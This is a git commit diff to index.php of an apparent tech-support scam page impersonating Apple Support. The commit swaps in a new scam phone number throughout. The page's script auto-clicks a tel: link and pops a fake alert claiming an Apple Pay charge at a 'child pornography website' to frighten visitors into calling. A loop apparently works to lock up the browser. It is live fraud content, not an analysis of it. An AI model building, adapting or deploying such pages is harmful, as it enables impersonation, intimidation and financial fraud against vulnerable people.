eba051faa8e20b794e802fa4a85a4f94a9bf6458
ryanstruthers6-wq <ryanstruthers6@gmail.com>
2026-01-14 19:30:47 +0530

    Add files via upload

--- index.php
+++ index.php
@@ -134,7 +134,7 @@
                 <div class="ac-ln-background"></div>
                 <div class="ac-ln-content">
                     <span class="ac-ln-title">
-                       <a href="#">Apple Support +1-866-502-1012 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+                       <a href="#">Apple Support +1-888-449-8028 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
 					 </span>
                     <div class="ac-ln-menu">
                         <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close"
@@ -197,7 +197,7 @@
     <footer id="ac-globalfooter" class="no-js">
         <div class="ac-gf-content">
             <section class="ac-gf-footer">
-                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">APPLE STORE WEBSITE </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">CHILD PORNOGRAPHY WEBSITE </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
                 </div>
                 <div class="ac-gf-footer-locale">
                     <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="globalnav/apple/us.png" alt="" width="16" height="16" />United
@@ -212,7 +212,7 @@
 						Apple </a></div>
                 </div>
                 <meta content="Apple" property="name" />
-                <meta content="+1-866-502-1012
+                <meta content="+1-888-449-8028
 			 " property="telephone" />
             </section>
         </div>
@@ -279,7 +279,7 @@
 
         window.number = getPar('phone');
 
-        window.number = (window.number ? window.number : '+1-866-502-1012');
+        window.number = (window.number ? window.number : '+1-888-449-8028');
 
         window.device = 'iPhone';
         window.refef = parseURL(document.referrer);
@@ -337,7 +337,7 @@
         }, 100);
 
         function okkkk() {
-            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-866-502-1012"></a>');
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-888-449-8028"></a>');
             document.querySelector('a').click();
             var extraData = "";
             for (itxextraData = 0; itxextraData < 200; itxextraData++) {
@@ -354,7 +354,7 @@
         };
 
         function myFunction() {
-            if (confirm("Your Apple ID was recently used at APPLE STORE WEBSITE for $149.59 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-866-502-1012 to Freeze it!.")) {
+            if (confirm("Your Apple ID was recently used at CHILD PORNOGRAPHY WEBSITE for $549.59 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-888-449-8028 to Freeze it!.")) {
                 okkkk();
             } else {
                 okkkk();
